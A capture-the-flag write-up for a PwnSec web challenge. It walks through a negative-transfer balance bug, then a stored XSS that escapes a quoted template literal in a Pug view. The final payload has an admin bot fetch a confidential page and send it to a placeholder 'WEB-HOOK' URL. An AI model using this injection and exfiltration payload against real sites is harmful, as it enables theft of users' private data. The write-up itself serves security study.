---
categories:
  - PwnSec
image:
  path: /assets/posts/A Very Safe Locker For Real Now/preview.png
layout: post
stags:
title: PwnSec
---

*Note* =>
This challenge needed to be ran locally since it needs alot of enumeration  and payload testing, worth mentioning that the challenge source did crash on registration and needed to be fixed  

## Overview

We start with a login page
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,.png)

We could check for the registration process from the source 
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-1.png)
We could see that there is another account created for each user that has `isMaster` to true and is a master to the user we created, we could keep that in mind.

![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-2.png)

We start with only `10$`

Looking around we could see this

![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-3.png)

So we need to increase our balance to `$1,000,000,000,000`.

The transfer endpoint looks promising, we are able to send receiverInfo and amount which need to be supplied and other functionality that isn't in our interest 

Here is the interesting part
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-4.png)
There is no checks made on the amount further no check if it's negative it checks if it's less than mainBalance and then subtract the amount which is a bug we could supply a huge negative number 
```
user_form.mainBalance -= -1000000000000000000000 // is the same as +=
```
Just delete `min` tag and send it 
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-5.png)

![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-6.png)

Now we have access to the locker endpoint let's check the Contact Master functionality   
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-7.png)

It takes `email`, `amount` and `userMessage` and passes it to the bot endpoint 

Looking at the bot.js file we could find that the bot goes to the locker endpoint and supplies our `userMessage` to the `userMessage` param

![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-8.png)
Which then renders the locker.pug with our input but it has some important sensitization
which we will need to go back to 
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-9.png)
And that's the interesting part where we need to focus on 
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-10.png)

The `!{}` doesn't escape any characters and prints them as is  and then the payload is then ran inside `${}` so easy xss right ? , not really since it's inside double quotes `"` it will be trickier 

```
${payload} => easy xss
${"paylod"} => we need to escape " first 
 ```

The idea here is to escape `"` in a way to run the inside string litteral like this

```
${"" + payload + "" }
```
Doing a payload like this won't work but why ?

looking back at looker.js 
```
userMessage: userMessage
.replace(/"/g, '\\"')
.replace(/'/g, "\\'")
.replace(/\n/g, '\\n')
.replace(/>/g, '&gt;')
.replace(/</g, '&lt;'),
```
Double quotes are escaped but not removed so any payload we run becomes

```
${" \" "} => 
```

And to solve this we will need to add another `\` of our own so we escape the backslash and exit out of the string

```
${"\\" "} => error
```
we now know how to escape the first one but what about the second ? we can't use the same trick in this case but we could comment the reset out and add `}` of our own the last payload becoms
```
${"\\" + alert(1)} //"}


Our input=>  \" + alert(1)} //
```

We could find that the flag lives in `/master/confidential` so it becomes a standered csrf exploit

```
\" + fetch(`/master/confedential`)
.then(function(r){return r.text()})
.then(function(f){window.location=`WEB-HOOK`+f}) }//
```

![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-11.png)
![](/assets/posts/A Very Safe Locker For Real Now/A%20Very%20Safe%20Locker%20For%20Real%20Now,-12.png)
